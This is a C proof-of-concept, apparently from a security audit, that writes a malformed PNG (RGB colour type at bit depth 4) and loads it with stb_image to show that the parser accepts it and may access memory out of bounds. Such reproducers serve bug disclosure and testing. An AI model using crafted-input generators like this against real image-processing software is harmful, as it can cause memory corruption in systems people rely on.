// PoC: H5 -- PNG invalid color type + bit depth combinations accepted
//
// The PNG spec says color type 2 (RGB) only allows depth 8 or 16.
// stb_image accepts RGB at depth 1/2/4, which hits bit-unpacking
// code designed for single-channel images, causing OOB access.
//
// Build: gcc -O0 -g -fsanitize=address -o poc_png_colordepth poc_png_colordepth.c -lm
// Run:   ./poc_png_colordepth

#define STB_IMAGE_IMPLEMENTATION
#include "../stb/stb_image.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

static uint32_t crc_table[256];
static int crc_ready = 0;

static void init_crc(void) {
    for (int n = 0; n < 256; n++) {
        uint32_t c = n;
        for (int k = 0; k < 8; k++)
            c = (c & 1) ? 0xedb88320u ^ (c >> 1) : c >> 1;
        crc_table[n] = c;
    }
    crc_ready = 1;
}

static uint32_t png_crc(const uint8_t *buf, int len) {
    if (!crc_ready) init_crc();
    uint32_t c = 0xffffffffu;
    for (int i = 0; i < len; i++)
        c = crc_table[(c ^ buf[i]) & 0xff] ^ (c >> 8);
    return c ^ 0xffffffffu;
}

static void put32be(uint8_t *p, uint32_t v) {
    p[0] = (v >> 24); p[1] = (v >> 16); p[2] = (v >> 8); p[3] = v;
}
static void put16le(uint8_t *p, uint16_t v) {
    p[0] = v; p[1] = v >> 8;
}

static uint32_t adler32(const uint8_t *d, int len) {
    uint32_t a = 1, b = 0;
    for (int i = 0; i < len; i++) { a = (a + d[i]) % 65521; b = (b + a) % 65521; }
    return (b << 16) | a;
}

static void write_chunk(FILE *f, const char *type, const uint8_t *data, int len) {
    uint8_t hdr[4]; put32be(hdr, len);
    fwrite(hdr, 1, 4, f); fwrite(type, 1, 4, f);
    if (len) fwrite(data, 1, len, f);
    uint8_t *tmp = malloc(4 + len);
    memcpy(tmp, type, 4); if (len) memcpy(tmp+4, data, len);
    put32be(hdr, png_crc(tmp, 4+len)); free(tmp);
    fwrite(hdr, 1, 4, f);
}

int main(void) {
    // create a PNG with color type 2 (RGB) and bit depth 4 (invalid per spec)
    const int W = 8, H = 4;
    const char *filename = "invalid_colordepth.png";

    FILE *f = fopen(filename, "wb");
    uint8_t sig[] = {137,80,78,71,13,10,26,10};
    fwrite(sig, 1, 8, f);

    // IHDR: 8x4, depth=4, color type=2 (RGB) -- INVALID per PNG spec
    uint8_t ihdr[13];
    put32be(ihdr, W); put32be(ihdr+4, H);
    ihdr[8] = 4;   // bit depth (invalid for RGB!)
    ihdr[9] = 2;   // color type: RGB
    ihdr[10] = 0; ihdr[11] = 0; ihdr[12] = 0;
    write_chunk(f, "IHDR", ihdr, 13);

    // IDAT: pixel data
    // for depth=4 RGB, each pixel is 3 nibbles = 12 bits = 1.5 bytes
    // row bytes = (W * 3 * 4 + 7) / 8 = (96 + 7) / 8 = 12
    int bpl = (W * 3 * 4 + 7) / 8;
    int raw_len = H * (1 + bpl);
    uint8_t *raw = calloc(1, raw_len);
    // fill with some data
    for (int y = 0; y < H; y++) {
        raw[y * (1 + bpl)] = 0; // no filter
        for (int x = 0; x < bpl; x++)
            raw[y * (1 + bpl) + 1 + x] = 0x55;
    }

    int zlib_len = 2 + 5 + raw_len + 4;
    uint8_t *zlib = malloc(zlib_len);
    zlib[0] = 0x78; zlib[1] = 0x01;
    zlib[2] = 0x01;
    put16le(zlib+3, raw_len); put16le(zlib+5, ~raw_len);
    memcpy(zlib+7, raw, raw_len);
    put32be(zlib+7+raw_len, adler32(raw, raw_len));

    write_chunk(f, "IDAT", zlib, zlib_len);
    write_chunk(f, "IEND", NULL, 0);
    fclose(f);
    free(raw); free(zlib);

    printf("wrote %s (RGB color type with bit depth 4 -- invalid per PNG spec)\n", filename);
    printf("stb_image should reject this but doesn't...\n\n");

    int w, h, ch;
    uint8_t *img = stbi_load(filename, &w, &h, &ch, 0);
    if (img) {
        printf("LOADED SUCCESSFULLY: %dx%d, %d channels\n", w, h, ch);
        printf("stb_image accepted an invalid color/depth combination.\n");
        printf("the bit-unpacking code may have read/written OOB.\n");
        printf("build with -fsanitize=address for details.\n");
        stbi_image_free(img);
    } else {
        printf("rejected: %s\n", stbi_failure_reason());
        printf("(this is the correct behavior)\n");
    }

    return 0;
}
